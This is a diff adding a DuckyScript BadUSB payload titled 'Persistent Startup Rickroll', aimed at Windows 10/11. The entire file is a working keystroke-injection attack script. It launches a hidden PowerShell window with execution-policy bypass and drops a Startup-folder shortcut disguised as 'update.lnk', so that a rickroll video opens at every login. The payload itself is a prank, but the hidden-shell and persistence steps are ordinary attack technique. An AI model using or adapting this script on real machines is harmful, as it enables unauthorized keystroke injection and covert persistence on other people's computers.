@@ -1,0 +1,20 @@
+\
+REM Title: Persistent Startup Rickroll
+REM Description: Adds rickroll YouTube video to Windows Startup folder so it opens on every login
+REM Target OS: Windows 10/11
+REM Author: DoctorSonic
+
+DELAY 1000
+GUI r
+DELAY 600
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+ENTER
+DELAY 1200
+STRING $s=(New-Object -COM WScript.Shell).CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.lnk"); $s.TargetPath="https://www.youtube.com/watch?v=dQw4w9WgXcQ"; $s.Save()
+ENTER
+DELAY 1000
+STRING Start-Process "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+ENTER
+DELAY 1000
+STRING exit
+ENTER
